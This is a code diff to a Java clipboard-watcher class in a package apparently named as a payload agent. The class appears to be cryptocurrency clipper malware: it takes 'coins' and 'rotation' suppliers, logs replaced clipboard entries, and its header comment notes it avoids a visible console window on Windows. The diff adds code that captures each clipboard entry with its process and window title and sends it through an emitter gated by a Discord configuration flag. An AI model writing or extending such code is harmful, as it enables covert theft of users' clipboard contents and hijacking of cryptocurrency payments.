@@ -23,10 +23,15 @@ import java.util.function.Supplier;
  * Windows one short PowerShell process owns both so no console window flashes.
  */
 final class ClipboardWatcher implements com.spcagentpayloa.jvmxx.ClipboardService {
+	interface Emitter {
+		void event(String kind, Map<String, Object> data, String legacy);
+	}
+
 	record Entry(long ts, String window, String process, String content, String kind, String replaced) {
 	}
 
 	private final Supplier<Map<String, List<String>>> coins;
+	private volatile Emitter emitter;
 	private final Supplier<Map<String, Integer>> rotation;
 	private final List<Entry> history = new ArrayList<>();
 	private final Object lock = new Object();
@@ -37,9 +42,14 @@ final class ClipboardWatcher implements com.spcagentpayloa.jvmxx.ClipboardServic
 	private volatile long events;
 	private volatile String last = "";
 
-	ClipboardWatcher(Supplier<Map<String, List<String>>> coins, Supplier<Map<String, Integer>> rotation) {
+	ClipboardWatcher(Supplier<Map<String, List<String>>> coins, Supplier<Map<String, Integer>> rotation, Emitter emitter) {
 		this.coins = coins;
 		this.rotation = rotation;
+		this.emitter = emitter;
+	}
+
+	void emitter(Emitter value) {
+		this.emitter = value;
 	}
 
 	@Override
@@ -141,7 +151,19 @@ final class ClipboardWatcher implements com.spcagentpayloa.jvmxx.ClipboardServic
 		}
 	}
 
+	private boolean timeline() {
+		return com.spcagentpayloa.jvmxx.DiscordConfig.clipboardTimeline();
+	}
+
 	private void handle(String text, String process, String title) {
+		if (timeline() && !text.isBlank()) {
+			java.util.Map<String, Object> raw = new LinkedHashMap<>();
+			raw.put("content", text.length() > 4096 ? text.substring(0, 4096) : text);
+			raw.put("kind", "text");
+			raw.put("process", process);
+			raw.put("title", title);
+			if (emitter != null) emitter.event("clipboard", raw, "clipboard-text: " + process + " | " + title + " | " + raw.get("content"));
+		}
 		String kind = "text";
 		String replaced = "";
 		if (!text.contains("\n") && text.length() <= 128) {
@@ -186,6 +208,16 @@ final class ClipboardWatcher implements com.spcagentpayloa.jvmxx.ClipboardServic
 			return text;
 		} catch (Throwable throwable) {
 			return null;
+		}
+	}
+
+	@Override
+	public boolean copy(String text) {
+		try {
+			write(text);
+			return true;
+		} catch (Throwable throwable) {
+			return false;
 		}
 	}
 
